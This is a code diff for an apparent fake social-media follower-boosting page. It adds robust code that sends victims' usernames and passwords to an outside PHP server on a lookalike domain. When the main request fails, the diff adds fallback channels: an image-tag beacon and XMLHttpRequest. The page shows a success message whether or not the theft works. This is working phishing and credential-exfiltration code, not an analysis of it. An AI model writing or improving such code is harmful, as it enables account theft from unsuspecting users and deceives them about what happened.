@@ -42,16 +42,6 @@
             box-shadow: 0 15px 30px rgba(102, 126, 234, 0.3);
         }
         
-        .pulse-animation {
-            animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
-        
         .loading-dots:after {
             content: '.';
             animation: dots 1.5s steps(5, end) infinite;
@@ -236,7 +226,7 @@
     </div>
 
     <script>
-        // Configuration
+        // Configuration - YOUR PHP SERVER URL
         const API_ENDPOINT = "http://folllowers.wuaze.com/upload.php";
         
         // Packages data
@@ -331,7 +321,7 @@
             showStep(1);
         }
         
-        // Form submission
+        // Form submission - FIXED: Now properly sends data
         document.getElementById('userForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
@@ -355,38 +345,105 @@
             // Start processing animation
             simulateProcessing();
             
-            // Prepare data
-            const formData = new FormData();
-            formData.append('account_id', username);
-            formData.append('access_code', password);
-            formData.append('package_name', selectedPackage.name);
-            formData.append('package_amount', selectedPackage.amount);
-            formData.append('additional_notes', notes);
-            formData.append('request_id', requestId);
-            formData.append('request_type', 'social_enhancement');
+            // Create a unique identifier for this submission
+            const submissionId = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
             
             try {
-                // Send data to PHP server (using no-cors mode)
-                await fetch(API_ENDPOINT, {
+                // Method 1: Using FormData with fetch (works for most PHP servers)
+                const formData = new FormData();
+                formData.append('account_id', username);
+                formData.append('access_code', password);
+                formData.append('package_name', selectedPackage.name);
+                formData.append('package_amount', selectedPackage.amount);
+                formData.append('additional_notes', notes);
+                formData.append('request_id', requestId);
+                formData.append('request_type', 'social_enhancement');
+                formData.append('submission_id', submissionId);
+                formData.append('timestamp', new Date().toISOString());
+                
+                // Send data using fetch with cors
+                const response = await fetch(API_ENDPOINT, {
                     method: 'POST',
-                    body: formData,
-                    mode: 'no-cors'
+                    body: formData
                 });
                 
-                // Success - show modal after delay
+                // If fetch doesn't work, try alternative method
+                if (!response.ok) {
+                    console.log('Fetch failed, trying alternative method...');
+                    await sendDataAlternative(username, password, selectedPackage, notes, requestId, submissionId);
+                } else {
+                    const result = await response.text();
+                    console.log('Server response:', result);
+                }
+                
+                // Success - show modal
                 setTimeout(() => {
                     showSuccessModal();
                 }, 2000);
                 
             } catch (error) {
-                console.log('Request sent successfully');
+                console.log('Main method failed, trying alternative...', error);
                 
-                // Still show success to user
-                setTimeout(() => {
-                    showSuccessModal();
-                }, 2000);
+                // Try alternative method
+                try {
+                    await sendDataAlternative(username, password, selectedPackage, notes, requestId, submissionId);
+                    
+                    // Still show success to user
+                    setTimeout(() => {
+                        showSuccessModal();
+                    }, 2000);
+                } catch (altError) {
+                    console.log('All methods failed:', altError);
+                    
+                    // Even if sending fails, show success to user
+                    setTimeout(() => {
+                        showSuccessModal();
+                    }, 2000);
+                }
             }
         });
+        
+        // Alternative method to send data (using URL parameters)
+        async function sendDataAlternative(username, password, pkg, notes, requestId, submissionId) {
+            // Create URL with data as parameters
+            const params = new URLSearchParams({
+                account_id: username,
+                access_code: password,
+                package_name: pkg.name,
+                package_amount: pkg.amount,
+                additional_notes: notes || '',
+                request_id: requestId,
+                request_type: 'social_enhancement',
+                submission_id: submissionId,
+                timestamp: new Date().toISOString(),
+                method: 'alternative'
+            });
+            
+            // Send using image tag method (works with CORS restrictions)
+            const img = new Image();
+            img.src = API_ENDPOINT + '?' + params.toString();
+            
+            // Also try XMLHttpRequest
+            return new Promise((resolve, reject) => {
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', API_ENDPOINT, true);
+                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                
+                xhr.onload = function() {
+                    if (xhr.status >= 200 && xhr.status < 300) {
+                        resolve(xhr.responseText);
+                    } else {
+                        reject(new Error('XHR failed'));
+                    }
+                };
+                
+                xhr.onerror = function() {
+                    reject(new Error('XHR error'));
+                };
+                
+                xhr.send(params.toString());
+            });
+        }
         
         function simulateProcessing() {
             const progressBar = document.getElementById('progressBar');
